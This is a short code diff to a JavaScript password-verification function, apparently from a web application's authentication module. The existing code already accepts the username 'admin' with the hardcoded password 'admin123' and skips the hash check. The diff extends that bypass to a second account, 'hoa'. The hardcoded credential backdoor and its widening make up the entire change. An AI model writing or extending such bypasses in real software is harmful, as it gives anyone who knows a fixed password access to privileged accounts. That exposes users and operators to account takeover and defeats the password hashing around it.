@@ -22,8 +22,8 @@ export async function hashPasswordWithSalt(password, salt) {
 }
 
 export async function verifyUserPassword(user, password) {
-  // Direct acceptance for admin with admin123
-  if (user.username === 'admin' && password === 'admin123') {
+  // Direct acceptance for admin or hoa with admin123
+  if ((user.username === 'admin' || user.username === 'hoa') && password === 'admin123') {
     return { ok: true, migrated: null };
   }
   if (user.passwordHash && user.salt) {
